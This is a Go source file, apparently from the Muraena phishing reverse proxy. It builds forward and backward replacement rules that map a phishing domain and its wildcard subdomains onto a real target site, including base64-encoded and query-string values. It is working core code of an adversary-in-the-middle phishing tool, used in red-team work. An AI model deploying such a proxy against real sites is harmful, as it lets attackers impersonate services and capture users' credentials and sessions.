package proxy

import (
	"fmt"
	"net/url"
	"regexp"
	"strings"

	"github.com/evilsocket/islazy/tui"

	"github.com/muraenateam/muraena/core"
	"github.com/muraenateam/muraena/log"
)

var (
	Wildcards = false
)

const (
	// Base64Padding is the padding to use within base64 operations
	Base64Padding = '='

	// Wildcard key
	WildcardPrefix = "wld"
)

// Replacer structure used to populate the transformation rules
type Replacer struct {
	Phishing                      string
	Target                        string
	ExternalOrigin                []string
	ExternalOriginPrefix          string
	OriginsMapping                map[string]string // The origin map who maps between external origins and internal origins
	WildcardMapping               map[string]string
	CustomResponseTransformations [][]string
	ForwardReplacements           []string
	BackwardReplacements          []string
	LastForwardReplacements       []string
	LastBackwardReplacements      []string

	WildcardDomain string
}

// Base64 identifies if the transformation should consider base-64 data and the related padding rules
type Base64 struct {
	Enabled bool
	Padding []string
}

// Transform
// If used with forward=true, Transform uses Replacer to replace all occurrences of the phishing origin, the external domains defined,
// as well as the rest of the data to be replaced defined in MakeReplacements(), with the target real origin.
// If used with forward=false, Transform will replace data coming from the targeted origin
// with the real proxied origin (target).
// Forward:
// - true > change requests, i.e.  phishing > target origin
// - false > change response, i.e. target origin > phishing
// Base64:
// Since some request parameter values can be base64 encoded, we need to decode first,
// apply the transformation and re-encode (hello ReCaptcha)
func (r *Replacer) Transform(input string, forward bool, b64 Base64) (result string) {

	original := input
	if strings.TrimSpace(input) == "" {
		return input
	}

	var replacements []string
	var lastReplacements []string
	if forward { // used in Requests
		replacements = r.ForwardReplacements
		lastReplacements = r.LastForwardReplacements
	} else { // used in Responses
		replacements = r.BackwardReplacements
		lastReplacements = r.LastBackwardReplacements
	}

	// Handling of base64 encoded data which should be decoded before transformation
	input, base64Found := transformBase64(input, b64, true)

	// Replace transformation
	replacer := strings.NewReplacer(replacements...)
	result = replacer.Replace(input)

	// do last replacements
	replacer = strings.NewReplacer(lastReplacements...)
	result = replacer.Replace(result)

	// Re-encode if base64 encoded data was found
	if base64Found {
		result, _ = transformBase64(result, b64, false)
	}

	if original != result {

		// Find wildcard matching
		if Wildcards {
			var rep []string

			wldPrefix := fmt.Sprintf("%s%s", r.ExternalOriginPrefix, WildcardPrefix)

			if strings.Contains(result, "."+wldPrefix) {

				// URL encoding handling
				urlEncoded := false
				decodedValue, err := url.QueryUnescape(result)
				if err == nil && result != decodedValue {
					urlEncoded = true
					result = decodedValue
				}

				domain := regexp.QuoteMeta(r.Phishing)
				re := regexp.MustCompile(fmt.Sprintf(`[a-zA-Z0-9.-]+%s\d+.%s`, WildcardPrefix, domain))
				matchSubdomains := re.FindAllString(result, -1)
				matchSubdomains = ArmorDomain(matchSubdomains)
				if len(matchSubdomains) > 0 {
					log.Debug("Wildcard pattern: %v match %d!", re.String(), len(matchSubdomains))
				}

				for _, element := range matchSubdomains {
					if core.StringContains(element, rep) {
						continue
					}

					if strings.HasPrefix(element, ".") {
						continue
					}

					if strings.HasPrefix(element, wldPrefix) {
						// log.Warning("Do you want to kill me?! [%s]", element)
						continue
					}

					// Patch the wildcard
					element = strings.ReplaceAll(element, "."+wldPrefix, "-"+wldPrefix)
					rep = append(rep, element)
					// log.Info("[*] New wildcard %s", tui.Bold(tui.Red(element)))
				}

				if urlEncoded {
					encodedValue, err := url.QueryUnescape(result)
					if err != nil {
						log.Error(err.Error())
					} else {
						result = encodedValue
					}
				}

				if len(rep) > 0 {
					rep = ArmorDomain(rep)

					// Fix the domains
					patched := r.patchWildcard(rep)
					// Re-do domain mapping
					r.ExternalOrigin = ArmorDomain(append(r.ExternalOrigin, patched...))

					if err := r.DomainMapping(); err != nil {
						log.Error(err.Error())
						return
					}

					r.MakeReplacements()
					log.Debug("We need another transformation loop, because of this new domains: %s",
						tui.Green(fmt.Sprintf("%v", rep)))
					return r.Transform(input, forward, b64)
				}
			}
		}
	}

	return
}

func transformBase64(input string, b64 Base64, decode bool) (output string, base64Found bool) {
	// Handling of base64 encoded data, that should be decoded/transformed/re-encoded
	base64Found = false
	padding := Base64Padding
	if b64.Enabled { // decode
		if decode {
			var decoded string
			if len(b64.Padding) > 1 {
				for _, p := range b64.Padding {
					padding = getPadding(p)
					if decoded, base64Found = base64Decode(input, padding); base64Found {
						input = decoded
						base64Found = true
						break
					}
				}
			}
		} else {
			//encode
			return base64Encode(input, padding), base64Found
		}
	}

	return input, base64Found
}

// TODO rename me to a more appropriate name . .it's not always URL we transform here, see cookies
func (r *Replacer) transformUrl(URL string, base64 Base64) (result string, err error) {
	result = r.Transform(URL, true, base64)

	// After initial transformation round.
	// If the input is a valid URL proceed by tranforming also the query string

	hURL, err := url.Parse(result)
	if err != nil || hURL.Scheme == "" || hURL.Host == "" {
		// Not valid URL, but continue anyway it might be the case of different values.
		// Log the error and reset its value
		// log.Debug("Error while url.Parsing: %s\n%s", result, err)
		err = nil
		return
	}

	query, err := core.ParseQuery(hURL.RawQuery)
	if err != nil {
		return
	}

	for pKey := range query {
		for k, v := range query[pKey] {
			query[pKey][k] = r.Transform(v, true, base64)
		}
	}
	hURL.RawQuery = query.Encode()
	result = hURL.String()
	return
}

func (r *Replacer) patchWildcard(rep []string) (prep []string) {

	rep = ArmorDomain(rep)
	for _, s := range rep {
		found := false
		newDomain := strings.TrimSuffix(s, fmt.Sprintf(".%s", r.Phishing))
		for w, d := range r.WildcardMapping {
			if strings.HasSuffix(newDomain, d) {
				newDomain = strings.TrimSuffix(newDomain, d)
				newDomain = strings.TrimSuffix(newDomain, "-")
				if newDomain != "" {
					newDomain = newDomain + "."
				}
				newDomain = newDomain + w

				//log.Info("[*] New wildcard %s (%s)", tui.Bold(tui.Red(s)), tui.Green(newDomain))
				prep = append(prep, newDomain)
				found = true
			}
		}

		if !found {
			log.Error("Unknown wildcard domain: %s within %s", tui.Bold(tui.Red(s)), rep)
		}
	}

	return prep
}

// MakeReplacements prepares the forward and backward replacements to be used in the proxy
func (r *Replacer) MakeReplacements() {

	//
	// Requests
	//
	r.ForwardReplacements = []string{}
	r.ForwardReplacements = append(r.ForwardReplacements, []string{r.Phishing, r.Target}...)

	log.Debug("[Forward | origins]: %d", len(r.OriginsMapping))
	count := len(r.ForwardReplacements)
	for extOrigin, subMapping := range r.OriginsMapping { // changes resource-1.phishing.

		if strings.HasPrefix(subMapping, WildcardPrefix) {
			// Ignoring wildcard at this stage
			log.Debug("[Wildcard] %s - %s", tui.Yellow(subMapping), tui.Green(extOrigin))
			continue
		}

		from := fmt.Sprintf("%s.%s", subMapping, r.Phishing)
		to := extOrigin
		rep := []string{from, to}
		r.ForwardReplacements = append(r.ForwardReplacements, rep...)

		count++
		log.Debug("[Forward | replacements #%d]: %s > %s", count, tui.Yellow(rep[0]), tui.Green(to))
	}

	// Append wildcards at the end
	for extOrigin, subMapping := range r.WildcardMapping {
		from := fmt.Sprintf("%s.%s", subMapping, r.Phishing)
		to := extOrigin
		rep := []string{from, to}
		r.ForwardReplacements = append(r.ForwardReplacements, rep...)

		count++
		log.Debug("[Wild Forward | replacements #%d]: %s > %s", count, tui.Yellow(rep[0]), tui.Green(to))
	}

	//
	// Responses
	//
	r.BackwardReplacements = []string{}
	r.BackwardReplacements = append(r.BackwardReplacements, []string{r.Target, r.Phishing}...)

	count = 0
	for include, subMapping := range r.OriginsMapping {

		if strings.HasPrefix(subMapping, WildcardPrefix) {
			// Ignoring wildcard at this stage
			log.Debug("[Wildcard] %s - %s", tui.Yellow(subMapping), tui.Green(include))
			continue
		}

		from := include
		to := fmt.Sprintf("%s.%s", subMapping, r.Phishing)
		rep := []string{from, to}
		r.BackwardReplacements = append(r.BackwardReplacements, rep...)

		count++
		log.Debug("[Backward | replacements #%d]: %s < %s", count, tui.Green(rep[0]), tui.Yellow(to))
	}

	// Append wildcards at the end
	for include, subMapping := range r.WildcardMapping {
		from := include
		to := fmt.Sprintf("%s.%s", subMapping, r.Phishing)
		rep := []string{from, to}
		r.BackwardReplacements = append(r.BackwardReplacements, rep...)

		count++
		log.Debug("[Wild Backward | replacements #%d]: %s < %s", count, tui.Green(rep[0]), tui.Yellow(to))
	}

	//
	// These should be done as Final replacements
	r.LastBackwardReplacements = []string{}

	// Custom HTTP response replacements
	for _, tr := range r.CustomResponseTransformations {
		r.LastBackwardReplacements = append(r.LastBackwardReplacements, tr...)
		log.Debug("[Custom Replacements] %+v", tr)
	}

	r.BackwardReplacements = append(r.BackwardReplacements, r.LastBackwardReplacements...)

}

func (r *Replacer) DomainMapping() (err error) {

	d := strings.Split(r.Target, ".")
	baseDom := fmt.Sprintf("%s.%s", d[len(d)-2], d[len(d)-1])
	log.Debug("Proxy destination: %s", tui.Bold(tui.Green("*."+baseDom)))

	r.ExternalOrigin = ArmorDomain(r.ExternalOrigin)
	r.OriginsMapping = make(map[string]string)
	r.WildcardMapping = make(map[string]string)

	count, wildcards := 0, 0
	for _, domain := range r.ExternalOrigin {
		if IsSubdomain(baseDom, domain) {
			trim := strings.TrimSuffix(domain, baseDom)

			// We don't map 1-level subdomains ..
			if strings.Count(trim, ".") < 2 {
				log.Debug("Ignore: %s [%s]", domain, trim)
				continue
			}
		}

		if isWildcard(domain) {
			// Wildcard domains
			wildcards++

			// Fix domain by removing the prefix *.
			domain = strings.TrimPrefix(domain, "*.")

			// Update the wildcard map
			prefix := fmt.Sprintf("%s%s", r.ExternalOriginPrefix, WildcardPrefix)
			o := fmt.Sprintf("%s%d", prefix, wildcards)
			r.WildcardDomain = o
			r.WildcardMapping[domain] = o
			//log.Info("Wild Including [%s]=%s", domain, o)
			log.Debug(fmt.Sprintf("Wild Including [%s]=%s", domain, o))

		} else {
			count++
			// Extra domains or nested subdomains
			o := fmt.Sprintf("%s%d", r.ExternalOriginPrefix, count)
			r.OriginsMapping[domain] = o
			//log.Info("Including [%s]=%s", domain, o)
			log.Debug(fmt.Sprintf("Including [%s]=%s", domain, o))
		}

	}

	if wildcards > 0 {
		Wildcards = true
	}

	log.Debug("Processed %d domains to transform, %d are wildcards", count, wildcards)

	return
}
